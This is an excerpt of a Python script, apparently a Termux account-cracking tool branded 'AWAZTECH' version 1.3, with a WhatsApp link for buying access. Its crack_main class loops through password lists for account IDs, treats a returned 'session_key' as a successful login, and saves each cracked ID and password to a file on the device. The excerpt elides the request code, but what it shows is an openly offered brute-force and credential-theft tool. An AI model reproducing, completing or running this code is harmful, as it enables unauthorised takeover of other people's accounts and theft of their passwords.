...
logo= f'''
 ...
 .d8b.  db   d8b   db  .d8b.  d88888D d888888b d88888b  .o88b. db   db 
d8' `8b 88   I8I   88 d8' `8b YP  d8' `~~88~~' 88'     d8P  Y8 88   88 
88ooo88 88   I8I   88 88ooo88    d8'     88    88ooooo 8P      88ooo88 
88~~~88 Y8   I8I   88 88~~~88   d8'      88    88~~~~~ 8b      88~~~88 
88   88 `8b d8'8b d8' 88   88  d8' db    88    88.     Y8b  d8 88   88 
YP   YP  `8b8' `8d8'  YP   YP d88888P    YP    Y88888P  `Y88P' YP   YP 
                                                                       
                                                 
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     M.Awaz Tech 
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+93775249673?text={bumper}")
                        qsbuy()
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[AWAZ] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[AWAZ-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/AWAZ_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
